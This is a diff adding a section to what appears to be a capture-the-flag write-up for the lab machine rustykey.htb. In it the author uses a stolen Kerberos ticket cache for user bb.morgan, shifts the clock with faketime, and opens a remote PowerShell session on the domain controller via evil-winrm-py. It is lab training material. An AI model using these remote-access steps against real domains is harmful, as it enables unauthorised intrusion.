@@ -316,6 +316,24 @@ I can get a TGT for this user
 
 # Winrm access `bb.morgan`
 
+So i still have privileges over `dd.ali` which i have not looked into yet, so if this turns out to be a dead end ill go back to that
+
+```python
+❯❯❯ export KRB5CCNAME=bb.morgan.ccache
+
+❯❯❯ faketime -f +8h evil-winrm-py -i dc.rustykey.htb -k --no-pass
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to 'dc.rustykey.htb:5985' as 'bb.morgan@RUSTYKEY.HTB'
+evil-winrm-py PS C:\Users\bb.morgan\Documents>
+```
+
+
+
 
 
 
